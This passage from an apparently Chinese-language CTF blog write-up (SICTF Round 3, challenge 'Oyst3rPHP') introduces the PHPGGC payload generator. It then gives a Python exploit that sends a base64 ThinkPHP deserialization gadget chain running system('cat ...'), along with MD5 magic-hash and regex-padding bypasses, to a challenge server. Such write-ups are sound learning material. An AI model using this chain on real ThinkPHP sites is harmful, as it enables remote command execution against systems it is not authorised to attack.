+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PHPGGC：</span><br><span class="line"></span><br><span class="line">PHPGGC 是一个 unserialize（） 有效负载库，以及从命令行或编程方式生成它们的工具。 当您在没有代码的网站上遇到反序列化时，或者只是在尝试构建漏洞时，此工具允许您生成有效负载，而无需经历查找小工具并组合它们的繁琐步骤。它可以被视为相当于frohoff的ysoserial，但对于PHP。 目前，该工具支持小工具链，例如：CodeIgniter4，Doctrine，Drupal7，Guzzle，Laravel，Magento，Monolog，Phalcon，Podio，Slim，SwiftMailer，Symfony，Wordpress，Yii和ZendFramework。</span><br><span class="line"></span><br><span class="line">以上是官网对它的描述</span><br><span class="line"></span><br><span class="line">为什么要用这个工具？一句话因为框架类的反序列化漏洞利用太过于复杂，用这个可以一键生成，就这么简单。</span><br><span class="line"></span><br><span class="line">那就要明白一件事，这个工具是针对于那些框架、组件来生成payload的，而不是原生类的，比如说很多CTF的题目，别人自己出的那种不涉及框架的代码，用这个工具是生成不出来的</span><br><span class="line"></span><br><span class="line">用的时候只需要知道目标的版本是否在漏洞版本区间然后用命令生成payload.</span><br><span class="line"></span><br><span class="line">使用方法:</span><br><span class="line">通过./phpggc 组件名 -i 可以显示与组建相关的信息，其中就包括了具体生成攻击payload所需要的参数</span><br></pre></td></tr></table></figure>
+
+<p>flag在&#x2F;Oyst3333333r.php下, 直接用phpggc拿出链子:<br><img src="/2024/02/17/SICTF-ROUND-3-web%E7%AC%94%E8%AE%B0/3.png"></p>
+<p>最终exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://yuanshen.life:39912/?left=QNKCDZO&amp;&amp;right=s878926199a&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: <span class="string">&#x27;h&#x27;</span>*<span class="number">1000000</span>+<span class="string">&quot;603THINKPHP&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;payload&#x27;</span>: <span class="string">&#x27;TzoxNzoidGhpbmtcbW9kZWxcUGl2b3QiOjc6e3M6MjE6IgB0aGlua1xNb2RlbABsYXp5U2F2ZSI7YjoxO3M6MTc6IgB0aGlua1xNb2RlbABkYXRhIjthOjE6e3M6NToiSmF5MTciO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MTI6IgAqAHdpdGhFdmVudCI7YjowO3M6MTk6IgB0aGlua1xNb2RlbABleGlzdHMiO2I6MTtzOjE4OiIAdGhpbmtcTW9kZWwAZm9yY2UiO2I6MTtzOjg6IgAqAHRhYmxlIjtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Nzp7czoyMToiAHRoaW5rXE1vZGVsAGxhenlTYXZlIjtiOjE7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJKYXkxNyI7czoyMToiY2F0IC9PeXN0MzMzMzMzM3IucGhwIjt9czoxMjoiACoAd2l0aEV2ZW50IjtiOjA7czoxOToiAHRoaW5rXE1vZGVsAGV4aXN0cyI7YjoxO3M6MTg6IgB0aGlua1xNb2RlbABmb3JjZSI7YjoxO3M6ODoiACoAdGFibGUiO3M6MDoiIjtzOjIxOiIAdGhpbmtcTW9kZWwAd2l0aEF0dHIiO2E6MTp7czo1OiJKYXkxNyI7czo2OiJzeXN0ZW0iO319czoyMToiAHRoaW5rXE1vZGVsAHdpdGhBdHRyIjthOjE6e3M6NToiSmF5MTciO3M6Njoic3lzdGVtIjt9fQ==&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text);</span><br></pre></td></tr></table></figure>
+<p>拿到flag: SICTF{4132f909-2e0c-457b-94c0-bbd536f0ea02}</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#EZ-SSRF"><span class="toc-number">1.1.</span> <span class="toc-text">EZ_SSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Not-just-unserialize"><span class="toc-number">1.2.</span> <span class="toc-text">Not just unserialize</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hacker"><span class="toc-number">1.3.</span> <span class="toc-text">hacker</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Oyst3rPHP"><span class="toc-number">1.4.</span> <span class="toc-text">Oyst3rPHP</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/02/17/SICTF-ROUND-3-web%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/02/17/SICTF-ROUND-3-web%E7%AC%94%E8%AE%B0/&text=SICTF-ROUND-3-web笔记"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/02/17/SICTF-ROUND-3-web%E7%AC%94%E8%AE%B0/&title=SICTF-ROUND-3-web笔记"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/02/17/SICTF-ROUND-3-web%E7%AC%94%E8%AE%B0/&is_video=false&description=SICTF-ROUND-3-web笔记"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SICTF-ROUND-3-web笔记&body=Check out this article: http://example.com/2024/02/17/SICTF-ROUND-3-web%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/02/17/SICTF-ROUND-3-web%E7%AC%94%E8%AE%B0/&title=SICTF-ROUND-3-web笔记"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/02/17/SICTF-ROUND-3-web%E7%AC%94%E8%AE%B0/&title=SICTF-ROUND-3-web笔记"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/02/17/SICTF-ROUND-3-web%E7%AC%94%E8%AE%B0/&title=SICTF-ROUND-3-web笔记"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/02/17/SICTF-ROUND-3-web%E7%AC%94%E8%AE%B0/&title=SICTF-ROUND-3-web笔记"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/02/17/SICTF-ROUND-3-web%E7%AC%94%E8%AE%B0/&name=SICTF-ROUND-3-web笔记&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/02/17/SICTF-ROUND-3-web%E7%AC%94%E8%AE%B0/&t=SICTF-ROUND-3-web笔记"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <!-- <footer id="footer"> -->
+<!--   <div class="footer-left"> -->
+<!--     Copyright &copy; -->
+<!--      -->
+<!--      -->
+<!--     2024-2034 -->
+<!--     wm -->
+<!--   </div> -->
+<!--   <div class="footer-right"> -->
+<!--     <nav> -->
+<!--       <ul> -->
+<!--         <!-- -->
+<!--       <li><a href="/">Home</a></li><!-- -->
+<!--     <!-- -->
+<!--       <li><a href="/about/">About</a></li><!-- -->
+<!--     <!-- -->
+<!--       <li><a href="/archives/">Writing</a></li><!-- -->
+<!--      -->
+<!--       </ul> -->
+<!--     </nav> -->
+<!--   </div> -->
+<!-- </footer> -->
+
+<footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2034
+    wm
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
